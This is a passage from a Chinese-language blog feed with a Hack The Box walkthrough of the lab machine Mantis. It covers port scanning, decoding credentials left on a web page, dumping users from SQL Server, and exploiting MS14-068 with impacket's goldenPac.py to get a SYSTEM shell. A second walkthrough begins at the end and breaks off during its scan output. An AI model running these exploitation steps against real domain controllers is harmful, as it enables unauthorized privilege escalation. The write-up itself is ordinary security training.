class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92 scan initiated Sun Apr 24 15:27:17 2022 as: nmap -sV -sC -p- -Pn -T4 -oA nmap.txt 10.10.10.52</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.52<br>Host is up (0.37s latency).<br>Not shown: 65508 closed tcp ports (reset)<br>PORT      STATE SERVICE      VERSION<br>53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)<br>| dns-nsid: <br>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)<br>88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-24 07:40:10Z)<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)<br>464/tcp   open  kpasswd5?<br>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>636/tcp   open  tcpwrapped<br>1337/tcp  open  http         Microsoft IIS httpd 7.5<br>|_http-server-header: Microsoft-IIS/7.5<br>|_http-title: IIS7<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2022-04-24T07:25:23<br>|_Not valid after:  2052-04-24T07:25:23<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-04-24T07:41:25+00:00; 0s from scanner time.<br>| ms-sql-ntlm-info: <br>|   Target_Name: HTB<br>|   NetBIOS_Domain_Name: HTB<br>|   NetBIOS_Computer_Name: MANTIS<br>|   DNS_Domain_Name: htb.local<br>|   DNS_Computer_Name: mantis.htb.local<br>|   DNS_Tree_Name: htb.local<br>|_  Product_Version: 6.1.7601<br>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)<br>3269/tcp  open  tcpwrapped<br>5722/tcp  open  msrpc        Microsoft Windows RPC<br>8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-server-header: Microsoft-IIS/7.5<br>|_http-title: Tossed Salad - Blog<br>9389/tcp  open  mc-nmf       .NET Message Framing<br>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>49152/tcp open  msrpc        Microsoft Windows RPC<br>49153/tcp open  msrpc        Microsoft Windows RPC<br>49154/tcp open  msrpc        Microsoft Windows RPC<br>49155/tcp open  msrpc        Microsoft Windows RPC<br>49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0<br>49158/tcp open  msrpc        Microsoft Windows RPC<br>49167/tcp open  msrpc        Microsoft Windows RPC<br>49176/tcp open  msrpc        Microsoft Windows RPC<br>49182/tcp open  msrpc        Microsoft Windows RPC<br>50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2022-04-24T07:25:23<br>|_Not valid after:  2052-04-24T07:25:23<br>|_ssl-<span class="hljs-built_in">date</span>: 2022-04-24T07:41:25+00:00; 0s from scanner time.<br>| ms-sql-ntlm-info: <br>|   Target_Name: HTB<br>|   NetBIOS_Domain_Name: HTB<br>|   NetBIOS_Computer_Name: MANTIS<br>|   DNS_Domain_Name: htb.local<br>|   DNS_Computer_Name: mantis.htb.local<br>|   DNS_Tree_Name: htb.local<br>|_  Product_Version: 6.1.7601<br>Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb-os-discovery: <br>|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)<br>|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1<br>|   Computer name: mantis<br>|   NetBIOS computer name: MANTIS\x00<br>|   Domain name: htb.local<br>|   Forest name: htb.local<br>|   FQDN: mantis.htb.local<br>|_  System time: 2022-04-24T03:41:09-04:00<br>| ms-sql-info: <br>|   10.10.10.52:1433: <br>|     Version: <br>|       name: Microsoft SQL Server 2014 RTM<br>|       number: 12.00.2000.00<br>|       Product: Microsoft SQL Server 2014<br>|       Service pack level: RTM<br>|       Post-SP patches applied: <span class="hljs-literal">false</span><br>|_    TCP port: 1433<br>|_clock-skew: mean: 34m17s, deviation: 1h30m43s, median: 0s<br>| smb2-security-mode: <br>|   2.1: <br>|_    Message signing enabled and required<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2022-04-24T07:41:14<br>|_  start_date: 2022-04-24T07:23:53<br>| smb-security-mode: <br>|   account_used: &lt;blank&gt;<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: required<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br><span class="hljs-comment"># Nmap done at Sun Apr 24 15:41:32 2022 -- 1 IP address (1 host up) scanned in 855.52 seconds</span><br></code></pre></td></tr></table></figure><h5 id="HTTP："><a href="#HTTP：" class="headerlink" title="HTTP："></a>HTTP：</h5><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424154848468.png" alt="image-20220424154848468"  /><p>什么都没有，或许我可以路径爆破看一眼：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ dirsearch -u http://10.10.10.52:1337<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                   <br> (_||| _) (/_(_|| (_| )                                                                                                                                                                                            <br>                                                                                                                                                                                                                   <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/worldisend/.dirsearch/reports/10.10.10.52-1337/_22-04-24_15-49-35.txt<br><br>Error Log: /home/worldisend/.dirsearch/logs/errors-22-04-24_15-49-35.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.52:1337/<br><br>[15:49:36] Starting: <br>[15:49:39] 403 -  312B  - /%2e%2e//google.com                              <br>[15:49:55] 403 -    2KB - /Trace.axd                                        <br>[15:49:56] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>[15:50:13] 403 -    1KB - /aspnet_client/                                   <br>[15:50:13] 301 -  161B  - /aspnet_client  -&gt;  http://10.10.10.52:1337/aspnet_client/<br>[15:50:15] 301 -  161B  - /secure_notes  -&gt;  http://10.10.10.52:1337/secure_notes/<br>                                                                             <br>Task Completed <br></code></pre></td></tr></table></figure><p>在secure_notes下有两个文件一个web.config会报404：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424155651622.png" alt="image-20220424155651622"></p><p>另一个名字特别长的向我表述了这样的信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. Download OrchardCMS<br>2. Download SQL server 2014 Express ,create user <span class="hljs-string">&quot;admin&quot;</span>,and create orcharddb database<br>3. Launch IIS and add new website and point to Orchard CMS folder location.<br>4. Launch browser and navigate to http://localhost:8080<br>5. Set admin password and configure sQL server connection string.<br>6. Add blog pages with admin user.<br></code></pre></td></tr></table></figure><p>看起来像是一个个人博客，用的OrchardCMS，默认开到了8080，哦对目标8080端口是对外开放的。但是信息并没有这么简单，因为右边有个滚动条，可以往下拉很长很长，如果稍微不注意就错过了这条关键信息，如果不是不小心碰了下触摸板，我兴许就会错过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Credentials stored <span class="hljs-keyword">in</span> secure format<br>OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001<br>SQL Server sa credentials file namez<br></code></pre></td></tr></table></figure><p>这是OrchardCMS管理admin用户的凭据，以二进制形式存储的，但是没关系，我可以解码：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">$ echo <span class="hljs-string">&quot;010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001&quot;</span> | perl -lpe <span class="hljs-string">&#x27;<span class="hljs-subst">$_</span>=pack&quot;B*&quot;,<span class="hljs-subst">$_</span>&#x27;</span><br><span class="hljs-meta">@dm</span>!n_P<span class="hljs-meta">@ssW</span>0rd!<br></code></pre></td></tr></table></figure><p>而且该文件的名字很奇怪，它看起来像是某种编码格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx&quot;</span> | <span class="hljs-built_in">base64</span> -d</span> <br>6d2424716c5f53405f504073735730726421<br></code></pre></td></tr></table></figure><p>我在Burpsuite编码解码模块中，把该字符串不断的通过Burpsuite内置的解码模块去尝试，当我选择ascii16进制解码时，我把那串看起来像哈希但其实不是的字符串给解码了出来：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424162116396.png" alt="image-20220424162116396"  /><p>我又拿到了一个密码。但我不知道他是做什么的，虽然它告诉了我是mql。我竟然如此轻易的就可以获取到一些关键信息，看来前边的路会艰难，我可以去访问一下8080：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424160741150.png" alt="image-20220424160741150"  /><p>白色背景，隐藏了很多按钮，但这次我不需要像往常一样对它们一一分析甄别，因为这次我有管理账户密码，可以直接登录后台：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span>/admin<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424160919664.png" alt="image-20220424160919664"  /><p>这CMS很眼熟，很多管理程序的web页面，还有团队博客，或是某漏洞靶场平台，但是这个博客我觉得像是混淆视听的：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">$</span> <span class="hljs-string">searchsploit</span> <span class="hljs-string">OrchardCMS</span>                                  <br><span class="hljs-attr">Exploits:</span> <span class="hljs-literal">No</span> <span class="hljs-string">Results</span><br><span class="hljs-attr">Shellcodes:</span> <span class="hljs-literal">No</span> <span class="hljs-string">Results</span><br></code></pre></td></tr></table></figure><p>因为它没有公开漏洞，而且搜索引擎中的漏洞也都只有漏洞信息公告，没有具体说明。或许我不应该把它放在优先位去探寻，因为目标还有很多其他端口。</p><h5 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h5><p>我可以尝试登录1433，它可以工作：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">$ sqsh -S <span class="hljs-number">10.10</span>.<span class="hljs-number">10.52</span> -U admin                          <br>sqsh-<span class="hljs-number">2.5</span>.<span class="hljs-number">16.1</span> Copyright (C) <span class="hljs-number">1995</span>-<span class="hljs-number">2001</span> Scott C. Gray<br>Portions Copyright (C) <span class="hljs-number">2004</span>-<span class="hljs-number">2014</span> Michael Peppler and Martin Wesdorp<br>This is free software with ABSOLUTELY NO WARRANTY<br>For more information type <span class="hljs-string">&#x27;\warranty&#x27;</span><br>Password: <br><span class="hljs-meta prompt_">1&gt; </span><br></code></pre></td></tr></table></figure><p><strong>查询所有数据库</strong>：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-meta prompt_">1&gt; </span>SELECT * FROM SYSDATABASES<br><span class="hljs-meta prompt_">2&gt; </span>go<br></code></pre></td></tr></table></figure><p>信息不多，但是它的格式让我很难复制过来放在这里，而且也无关紧要，我只放关键的：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">master</span>                                                                                               <br><span class="hljs-title">tempdb</span>                                                                                               <br>model                                                                                               <br>msdb                                                                                                 <br>orcharddb                 <br></code></pre></td></tr></table></figure><p>五个数据库，以及它们的目录，都是这样的格式：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\DATA\orcharddb.mdf   <br></code></pre></td></tr></table></figure><h5 id="IP-10-10-10-52-445-Name-htb-local-获取orcharddb-数据库的所有表："><a href="#IP-10-10-10-52-445-Name-htb-local-获取orcharddb-数据库的所有表：" class="headerlink" title="[+] IP: 10.10.10.52:445 Name: htb.local               获取orcharddb 数据库的所有表："></a>[+] IP: 10.10.10.52:445 Name: htb.local               获取orcharddb 数据库的所有表：</h5><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-meta prompt_">1&gt; </span>SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES<br><span class="hljs-meta prompt_">2&gt; </span>go<br></code></pre></td></tr></table></figure><p>信息也很多，费眼睛。</p><h5 id="获取orcharddb-数据库的所有列："><a href="#获取orcharddb-数据库的所有列：" class="headerlink" title="获取orcharddb 数据库的所有列："></a>获取orcharddb 数据库的所有列：</h5><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-meta prompt_">1&gt; </span>SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS<br><span class="hljs-meta prompt_">2&gt; </span>go<br></code></pre></td></tr></table></figure><p>这东西最好找个图形化数据库连接工具，要不真的是在给自己找罪受。</p><h5 id="获取博客用户记录："><a href="#获取博客用户记录：" class="headerlink" title="获取博客用户记录："></a>获取博客用户记录：</h5><p>在orcharddb中有这么一个表，它的名字是blog_Orchard_Users_UserPartRecord，用户记录：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-meta prompt_">1&gt; </span>use orcharddb<br><span class="hljs-meta prompt_">2&gt; </span>go<br><span class="hljs-meta prompt_">1&gt; </span>SELECT * FROM blog_Orchard_Users_UserPartRecord<br><span class="hljs-meta prompt_">2&gt; </span>go<br></code></pre></td></tr></table></figure><p>其中会包含一些信息，我还是截图吧。。。。</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424164539688.png" alt="image-20220424164539688"  /><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424164558353.png" alt="image-20220424164558353"  /><p>它看起来像是个域用户，看起来还获取到了它的密码。验证其合法不合法也简单，我去rpc试一下就可以：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ rpcclient -U james 10.10.10.52                        <br>Enter WORKGROUP\james&#x27;s password: <br>rpcclient $&gt; enumdomusers<br>user:<span class="hljs-comment">[Administrator]</span> rid:<span class="hljs-comment">[0x1f4]</span><br>user:<span class="hljs-comment">[Guest]</span> rid:<span class="hljs-comment">[0x1f5]</span><br>user:<span class="hljs-comment">[krbtgt]</span> rid:<span class="hljs-comment">[0x1f6]</span><br>user:<span class="hljs-comment">[james]</span> rid:<span class="hljs-comment">[0x44f]</span><br>rpcclient $&gt;<br></code></pre></td></tr></table></figure><p>我可以获取目标的系统版本：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">rpcclient</span> $&gt; srvinfo<br>        <span class="hljs-attribute">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">52</span>    Wk Sv Sql PDC Tim NT <br>        <span class="hljs-attribute">platform_id</span>     :       <span class="hljs-number">500</span><br>        <span class="hljs-attribute">os</span> version      :       <span class="hljs-number">6</span>.<span class="hljs-number">1</span><br>        <span class="hljs-attribute">server</span> type     :       <span class="hljs-number">0</span>x80102f<br><span class="hljs-attribute">rpcclient</span> $&gt; <br></code></pre></td></tr></table></figure><p>可以在这个url对版本号进行比对：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>en.wikipedia.org<span class="hljs-regexp">/wiki/</span>Comparison_of_Microsoft_Windows_versions<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220424165825467.png" alt="image-20220424165825467"  /><p>Nmap为我枚举是2008 R2，与之对的上。看起来目标应该是Windows 2008 R2系统。</p><p>我可以枚举一些域内的组：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs inform7">rpcclient $&gt; enumalsgroups domain<br>group:<span class="hljs-comment">[Cert Publishers]</span> rid:<span class="hljs-comment">[0x205]</span><br>group:<span class="hljs-comment">[RAS and IAS Servers]</span> rid:<span class="hljs-comment">[0x229]</span><br>group:<span class="hljs-comment">[Allowed RODC Password Replication Group]</span> rid:<span class="hljs-comment">[0x23b]</span><br>group:<span class="hljs-comment">[Denied RODC Password Replication Group]</span> rid:<span class="hljs-comment">[0x23c]</span><br>group:<span class="hljs-comment">[DnsAdmins]</span> rid:<span class="hljs-comment">[0x44d]</span><br>group:<span class="hljs-comment">[SQLServer2005SQLBrowserUser$MANTIS]</span> rid:<span class="hljs-comment">[0x450]</span><br>rpcclient $&gt; <br></code></pre></td></tr></table></figure><p>我会注意到DnsAdmins组，因为之前我通过远程注入DLL获取到过一台机器的system shell，SQLServer2005SQLBrowserUser$MANTIS我也会注意，因为我便是通过SQLServer获取到的凭证。</p><p>我有个合法的账户口令，但是我却登录不上去，因为目标也没有开启winrm协议端口，也未开启RDP。</p><p>但是windows 2008 作为域控服务器会存在一个漏洞，MS14-068域控提权漏洞(CVE-2014-6324），我习惯枚举敏感信息收集以及错误配置了，要不是又在标签中看到了CVE-2014-6324，我都没想到还有漏洞利用。如想了解更多的细节可参考以下文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>labs.f-secure.com<span class="hljs-regexp">/archive/</span>digging-into-ms14-<span class="hljs-number">068</span>-exploitation-and-defence/<br></code></pre></td></tr></table></figure><p>Metasploit只有该漏洞的检测模块，没有该漏洞的利用模块。</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs prolog">sf-pro auxiliary(admin/kerberos/ms14_068_kerberos_checksum) &gt; run<br>[*] <span class="hljs-symbol">Running</span> module against <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span><br><br>[*] <span class="hljs-symbol">Validating</span> options...<br>[*] <span class="hljs-symbol">Using</span> domain <span class="hljs-symbol">HTB</span>.<span class="hljs-symbol">LOCAL</span>...<br>[*] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span>:<span class="hljs-number">88</span> - <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">AS</span>-<span class="hljs-symbol">REQ</span>...<br>[*] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span>:<span class="hljs-number">88</span> - <span class="hljs-symbol">Parsing</span> <span class="hljs-symbol">AS</span>-<span class="hljs-symbol">REP</span>...<br>[*] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span>:<span class="hljs-number">88</span> - <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">TGS</span>-<span class="hljs-symbol">REQ</span>...<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span>:<span class="hljs-number">88</span> - <span class="hljs-symbol">Valid</span> <span class="hljs-symbol">TGS</span>-<span class="hljs-symbol">Response</span>, extracting credentials...<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span>:<span class="hljs-number">88</span> - <span class="hljs-symbol">MIT</span> <span class="hljs-symbol">Credential</span> <span class="hljs-symbol">Cache</span> saved on /opt/metasploit/apps/pro/loot/<span class="hljs-number">20220424175459</span><span class="hljs-symbol">_default_10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span><span class="hljs-number">.52</span><span class="hljs-symbol">_windows</span>.kerberos_724354.bin<br>[*] <span class="hljs-symbol">Auxiliary</span> module execution completed<br></code></pre></td></tr></table></figure><p>但是它可以帮我验证目标确实存在该漏洞，漏洞利用脚本在&#x2F;impacket-0.9.24&#x2F;examples中：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs inform7">$ ./goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52 HTB.LOCAL/james@mantis.htb.local<br>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation<br><br>Password:<br><span class="hljs-comment">[*]</span> User SID: S-1-5-21-4220043660-4019079961-2895681657-1103<br><span class="hljs-comment">[-]</span> Couldn&#x27;t get forest info (<span class="hljs-comment">[Errno Connection error (htb.local:445)]</span> <span class="hljs-comment">[Errno -2]</span> Name or service not known), continuing<br><span class="hljs-comment">[*]</span> Attacking domain controller 10.10.10.52<br><span class="hljs-comment">[*]</span> 10.10.10.52 found vulnerable!<br><span class="hljs-comment">[*]</span> Requesting shares on 10.10.10.52.....<br><span class="hljs-comment">[*]</span> Found writable share ADMIN$<br><span class="hljs-comment">[*]</span> Uploading file DorWWjHF.exe<br><span class="hljs-comment">[*]</span> Opening SVCManager on 10.10.10.52.....<br><span class="hljs-comment">[*]</span> Creating service QvJn on 10.10.10.52.....<br><span class="hljs-comment">[*]</span> Starting service QvJn.....<br><span class="hljs-comment">[!]</span> Press help for extra shell commands<br>Microsoft Windows <span class="hljs-comment">[Version 6.1.7601]</span><br>Copyright (c) 2009 Microsoft Corporation.  All rights reserved.<br><br>C:\Windows\system32&gt;whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;<br></code></pre></td></tr></table></figure><p>注意密码，尽量自己手动输入，因为复制粘贴会很坑，我觉得是作者故意的，密码中的一些特殊符号会导致很多工具对参数错误的识别。</p><h5 id="获取flag："><a href="#获取flag：" class="headerlink" title="获取flag："></a>获取flag：</h5><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\james&gt;cd desktop<br> <br><span class="hljs-name">C</span>:\Users\james\Desktop&gt;<span class="hljs-built_in">type</span> user.txt<br><br><span class="hljs-name">C</span>:\Users\Administrator\Desktop&gt;<span class="hljs-built_in">type</span> root.txt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Active Directory</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Json</title>
    <link href="/post/HackTheBox-Json.html"/>
    <url>/post/HackTheBox-Json.html</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Nmap 7.92 scan initiated Sat Apr  9 17:49:41 2022 as: nmap -sV -sC -Pn -T4 -p- -oA nmap.txt 10.10.10.158</span><br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.158<br>Host is up (0.40s latency).<br>Not shown: 65521 closed tcp ports (reset)<br>PORT      STATE SERVICE      VERSION<br>21/tcp    open  ftp          FileZilla ftpd<br>| ftp-syst: <br>|_  SYST: UNIX emulated by FileZilla<br>80/tcp    open  http         Microsoft IIS httpd 8.5<br>|_http-server-header: Microsoft-IIS/8.5<br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>|_http-title: Json HTB<br>135/tcp   open  msrpc        Microsoft Windows RPC<br>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>|_http-server-header: Microsoft-HTTPAPI/2.0<br>|_http-title: Not Found<br>49152/tcp open  msrpc        Microsoft Windows RPC<br>49153/tcp open  msrpc        Microsoft Windows RPC<br>49154/tcp open  msrpc        Microsoft Windows RPC<br>49155/tcp open  msrpc        Microsoft Windows RPC<br>49156/tcp open  msrpc        Microsoft Windows RPC<br>49157/tcp open  msrpc        Microsoft Windows RPC<br>49158/tcp open  msrpc        Microsoft 